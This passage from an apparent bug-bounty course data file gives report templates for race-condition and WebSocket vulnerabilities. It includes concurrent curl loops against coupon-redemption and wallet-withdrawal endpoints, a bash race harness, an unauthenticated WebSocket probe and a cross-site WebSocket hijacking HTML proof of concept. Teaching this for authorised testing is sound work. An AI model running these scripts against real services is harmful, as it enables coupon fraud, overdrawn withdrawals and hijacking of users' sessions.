            cmd: '## Race Condition — Report Template\n\n**Title:** Race Condition (TOCTOU) in [ENDPOINT] — bypass [LIMIT_TYPE] via concurrent requests\n\n**Severity:** High (CVSS: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)\n\n**Description:**\nThe `[ENDPOINT]` endpoint checks a condition (balance, usage count, single-use flag) and then performs an action — but the check and action are not atomic. Sending multiple concurrent requests can bypass the check because they all read the pre-check state before any of them updates it.\n\n**Impact:**\n- Apply the same coupon/discount multiple times\n- Redeem the same gift card code repeatedly\n- Withdraw more than the account balance\n- Vote multiple times in a single-vote-per-user system\n- [If applicable: create unlimited resources with a single-use token]\n\n**Steps to Reproduce:**\n1. Identify the race window: the time between the server checking the condition and applying the change\n2. Send 20+ concurrent requests to the endpoint:\n   `for i in $(seq 1 20); do curl -s \'[ENDPOINT]\' -d \'[PARAM]=[VALUE]\' -H \'Cookie: SESSION\' &; done; wait`\n3. Check the resource state:\n   - Coupon: applied [N] times instead of 1\n   - Balance: deducted more than the available balance\n   - Token: [N] resources created from one token\n4. Repeat with different timing windows to maximize the race\n\n**Proof of Concept:**\n[Screenshot showing the resource applied N times with timestamps]\n[The exact curl command used for the race]\n\n**Remediation:**\n- Use database-level atomic operations (e.g., UPDATE ... WHERE condition, not SELECT then UPDATE)\n- Implement pessimistic locking for critical resources\n- Use idempotency keys: each request carries a unique key that can only succeed once\n- Apply rate limiting per-user for sensitive endpoints',
            desc: "Race Condition report template — demonstrates concurrent request exploitation with proof of double-redemption",
          },
          {
            cmd: 'for i in $(seq 1 30); do curl -s "https://target.com/api/coupon/redeem" -d "code=DISCOUNT50" -H "Cookie: SESSION" -o /dev/null -w "Request $i: %{http_code}\\n" &; done; wait',
            desc: "Race condition PoC: send 30 concurrent coupon redemption requests — if more than one succeeds, race condition confirmed",
          },
          {
            cmd: "cat << 'EOF' > race-condition-test.sh\n#!/bin/bash\nENDPOINT=\"$1\"\nDATA=\"$2\"\nTIMES=\"${3:-20}\"\necho \"Sending $TIMES concurrent requests to $ENDPOINT...\"\nfor i in $(seq 1 $TIMES); do\n  curl -s \"$ENDPOINT\" -d \"$DATA\" -H 'Cookie: SESSION' -o \"response-$i.txt\" -w \"%{http_code}\\n\" &\ndone\nwait\necho \"Success count: $(grep -c '200' response-*.txt 2>/dev/null || echo 0)\"\necho \"Unique responses: $(cat response-*.txt 2>/dev/null | sort -u | wc -l)\"\nEOF\nchmod +x race-condition-test.sh && ./race-condition-test.sh \"https://target.com/api/coupon/redeem\" \"code=DISCOUNT50\" 30",
            desc: "Race condition test harness — sends N concurrent requests and counts how many succeeded (should be 1, more = race)",
          },
          {
            cmd: "cat << 'EOF' > race-evidence.txt\nRace Condition Confirmation\n============================\nEndpoint: /api/coupon/redeem\nParameter: code=DISCOUNT50 (single-use coupon)\n\nResults:\n- Requests sent: 30 (concurrent)\n- Successful redemptions: 7 (should be 1)\n- Coupon status after test: USED (correctly marked)\n- But 7 successful redemptions occurred before status update\n\nWindow Analysis:\n- Average request time: 45ms\n- Race window: ~30-50ms (between SELECT and UPDATE)\n- Concurrency required: 15+ simultaneous requests\n\nImpact:\n- Unlimited coupon/discount abuse\n- [If applicable: financial loss to the company]\nEOF",
            desc: "Race condition evidence template — document the concurrency count, race window, and successful exploitation rate",
          },
          {
            cmd: 'echo "Send 50 parallel requests to test withdrawal race:"; parallel -j 50 curl -s "https://target.com/api/wallet/withdraw" -d "amount=100" -H "Cookie: SESSION" -o /dev/null -w "%{http_code}\\n" ::: $(seq 1 50) | sort | uniq -c',
            desc: "Parallel race condition test with GNU Parallel — 50 concurrent withdrawal requests, count success vs failure",
          },
        ],
        tips: [
          "The race window is typically 5-100ms — send 20-50 concurrent requests; the more the wider the race window appears",
          "Burp Turbo Intruder is better than curl for sub-millisecond race windows — it sends requests in a single TCP packet",
          "Not all race conditions are about money — think about: single-vote systems, avatar uploads, username changes",
          "Document the exact number of successful race exploits — 'coupon applied 7 times' is stronger than 'applied multiple times'",
        ],
      },
      {
        title: "WebSocket Vulnerability Report Template",
        text: "WebSocket connections often bypass HTTP security controls entirely. Common WebSocket vulnerabilities include missing authentication (anyone can connect), message injection (no input validation on messages), and cross-origin WebSocket hijacking (any website can open a socket to the target). The report must demonstrate either unauthenticated data access or injection via WebSocket messages.",
        commands: [
          {
            cmd: '## WebSocket Vulnerability — Report Template\n\n**Title:** [WebSocket Missing Auth / WebSocket Injection] in [WS_ENDPOINT]\n\n**Severity:** [High/Critical based on impact]\n\n**Description:**\nThe WebSocket endpoint at `[WS_ENDPOINT]` [vulnerability description]. Unlike HTTP endpoints, this WebSocket connection [bypasses auth / lacks input validation / allows cross-origin connections], exposing [data or functionality] to unauthorized parties.\n\n**Impact:**\n- [If auth bypass: read real-time data streams without authentication]\n- [If injection: manipulate the WebSocket connection to perform actions on behalf of other users]\n- [If CSWSH: any website can open a WebSocket to the target and act as the victim]\n\n**Steps to Reproduce:**\n1. Open a WebSocket connection to the target WITHOUT any authentication:\n   ```javascript\n   const ws = new WebSocket("wss://target.com/ws");\n   ws.onmessage = (e) => console.log(e.data);\n   ws.onopen = () => ws.send(\'["GET", "/admin/events"]\');\n   ```\n2. If the connection opens successfully AND returns data, WebSocket auth is missing\n3. Test cross-origin: run the same JavaScript from a DIFFERENT domain\n\n**Proof of Concept:**\n[Attach screenshot of WebSocket connection opening without auth]\n[Attach screenshot of data returned via unauthenticated WebSocket]\n\n**Remediation:**\n- Authenticate WebSocket connections during the upgrade handshake (validate session in the upgrade request)\n- Apply per-message authorization checks — don\'t assume auth at connect time is sufficient\n- Validate Origin header during the WebSocket upgrade to prevent cross-origin attacks\n- Treat WebSocket messages with the same validation rigor as HTTP request bodies',
            desc: "WebSocket report template — covers missing auth, message injection, and cross-origin hijacking",
          },
          {
            cmd: "cat << 'EOF' > ws-auth-test.py\n#!/usr/bin/env python3\nimport asyncio, websockets, sys\n\nasync def test_ws():\n    uri = sys.argv[1] if len(sys.argv) > 1 else \"wss://target.com/ws\"\n    print(f\"Connecting to {uri} WITHOUT authentication...\")\n    try:\n        async with websockets.connect(uri) as ws:\n            msg = await asyncio.wait_for(ws.recv(), timeout=5)\n            print(f\"CONNECTED! Received: {msg[:200]}\")\n            print(\"VULNERABLE: WebSocket accepts unauthenticated connections\")\n    except Exception as e:\n        print(f\"Connection failed (expected if auth is enforced): {e}\")\n\nasyncio.run(test_ws())\nEOF\npython3 ws-auth-test.py wss://target.com/ws",
            desc: "WebSocket auth test — if the connection opens without any session cookie, WebSocket authentication is missing",
          },
          {
            cmd: "cat << 'EOF' > ws-csrf-test.html\n<!DOCTYPE html><html><body>\n<h2>Cross-Site WebSocket Hijacking (CSWSH) PoC</h2>\n<p>This page opens a WebSocket to the target from a DIFFERENT origin.</p>\n<pre id=\"log\"></pre>\n<script>\nconst log = document.getElementById('log');\nconst ws = new WebSocket('wss://target.com/ws');\nws.onopen = () => {\n  log.textContent += '[OPEN] Connection established from evil.com origin\\n';\n  ws.send(JSON.stringify({action: 'getProfile', userId: 1}));\n};\nws.onmessage = (e) => {\n  log.textContent += '[DATA] ' + e.data + '\\n';\n};\nws.onerror = () => log.textContent += '[ERROR] Connection rejected or failed\\n';\n</script>\n</body></html>\nEOF",
            desc: "Cross-Site WebSocket Hijacking PoC HTML — open this from a different origin to test if WebSocket accepts cross-origin connections",
          },
          {
            cmd: "cat << 'EOF' > ws-evidence.txt\nWebSocket Vulnerability Confirmation\n=====================================\nWebSocket Endpoint: wss://target.com/ws\n\nAuth Bypass:\n[x] Connection WITHOUT session cookie — SUCCESS\n[x] Data received without authentication — [YES / NO]\n\nCross-Origin:\n[x] Connection from evil.com — SUCCESS\n[x] Origin header validated — [NO / YES]\n\nMessage Injection:\n[x] Malformed messages accepted — [YES / NO]\n[x] SQL injection in message parameters — [TESTED]\n\nData Access:\n- Real-time events accessible: [user actions, admin events, chat messages]\n- User-specific data accessible: [YES — specify what data]\nEOF",
            desc: "WebSocket evidence template — document auth, CORS, and injection test results",
          },
          {
            cmd: "curl -s -i 'https://target.com' -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -o /dev/null -w 'Status: %{http_code}\\n'",
            desc: "WebSocket upgrade request via curl — a 101 Switching Protocols with no session cookie confirms missing auth",
          },
        ],
        tips: [
          "WebSocket connections inherit the HTTP session from the upgrade request — but many apps skip session validation during upgrade",
          "Test WebSocket endpoints with wscat (npm install -g wscat) — wscat -c wss://target.com/ws connects without cookies by default",
          "If WebSocket auth exists, test for IDOR via WebSocket messages — changing user IDs in JSON messages may bypass HTTP IDOR protections",
          "Cross-origin WebSocket hijacking is Rising: any website can read real-time data from the target if Origin isn't validated",
        ],
      },
    ],
    tools: [
      {
        name: "websockets (Python)",
        desc: "Python library for programmatic WebSocket testing — connect, send messages, and receive data",
        install: "pip3 install websockets",
        link: "https://websockets.readthedocs.io/",
      },
      {
        name: "wscat",
        desc: "Simple WebSocket command-line client — connect and interact with WebSocket endpoints interactively",
        install: "npm install -g wscat",
        link: "https://github.com/websockets/wscat",
      },
      {
        name: "Turbo Intruder",
        desc: "Burp extension for race condition testing — sends requests in a single TCP packet for sub-millisecond races",
        link: "https://github.com/PortSwigger/turbo-intruder",
      },
      {
        name: "SSTI Map",
        desc: "Comprehensive SSTI payload generator and detector across multiple template engines",
        install: "git clone https://github.com/vladko312/SSTImap.git",
        link: "https://github.com/vladko312/SSTImap",
      },
    ],
    summary:
      "You now have report templates for the four most advanced web vulnerability classes: SSTI (template engine RCE), XXE (file read and SSRF via XML), Race Conditions (concurrent request exploits), and WebSocket vulnerabilities (auth bypass and cross-origin hijacking). These findings consistently receive the highest bounties because they demonstrate deep understanding of modern web architecture.",
  },
]
